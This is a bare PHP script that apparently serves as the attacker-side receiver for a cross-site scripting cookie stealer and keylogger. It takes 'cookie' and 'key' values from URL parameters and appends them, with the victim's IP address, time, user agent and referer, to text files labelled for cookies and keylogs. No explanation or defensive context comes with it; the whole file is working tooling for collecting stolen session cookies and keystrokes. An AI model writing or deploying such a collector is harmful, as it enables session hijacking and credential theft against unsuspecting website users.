<?php
$ip=getenv('REMOTE_ADDR');
$time=date('Y-m-d g:i:s');
$referer = $_SERVER['HTTP_REFERER'];
$agent=$_SERVER['HTTP_USER_AGENT'];
$cookie=$_GET['cookie'];
$key=$_GET['key'];
if (!empty($cookie)) {
	$fp=fopen('cookie.txt', 'a');
	if ($fp) {
	fwrite($fp," IP: " .$ip. "\n Date and Time: " .$time. "\n User Agent:".$agent."\n Referer: ".$referer."\n Cookie: ".$cookie."\n\n\n");
		fclose($fp);
	}
	else{
		echo "error";
	}
}
if (!empty($key)) {
	$fp=fopen('key.txt', 'a');
	if ($fp) {
	fwrite($fp,"IP: " .$ip. "\n Date and Time: "."Keylog: ".$key."\n\n\n");
		fclose($fp);
	}
	else{
		echo "error";
	}
}
?>
